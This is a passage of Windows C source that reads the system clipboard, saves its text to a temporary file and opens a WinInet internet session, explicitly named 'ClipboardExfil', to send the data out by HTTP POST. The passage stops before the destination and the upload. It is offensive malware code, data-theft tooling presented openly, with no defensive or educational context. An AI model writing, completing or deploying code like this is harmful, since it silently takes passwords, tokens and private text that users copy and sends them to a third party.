    HGLOBAL hGlobal = GetClipboardData(CF_TEXT);
    if (hGlobal == NULL) {
        CloseClipboard();
        printf("No text data in clipboard\n");
        return;
    }

    // Lock the global memory block and get a pointer to its content
    char *clipText = (char *)GlobalLock(hGlobal);
    if (clipText == NULL) {
        CloseClipboard();
        printf("Failed to lock clipboard memory\n");
        return;
    }

    // Prepare a file path for temporary text storage
    char filePath[MAX_PATH];
    GetTempFileName(".", "temp", 0, filePath);

    // Write the clipboard content to the temporary file
    FILE *file = fopen(filePath, "w");
    if (file != NULL) {
        fprintf(file, "%s", clipText);
        fclose(file);
    } else {
        GlobalUnlock(hGlobal);
        CloseClipboard();
        printf("Failed to create temporary file\n");
        return;
    }

    // Prepare HTTP POST request using WinInet
    HINTERNET hInternet = InternetOpenA("ClipboardExfil", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        GlobalUnlock(hGlobal);
        CloseClipboard();
        printf("Failed to initialize Internet session\n");
        return;
    }

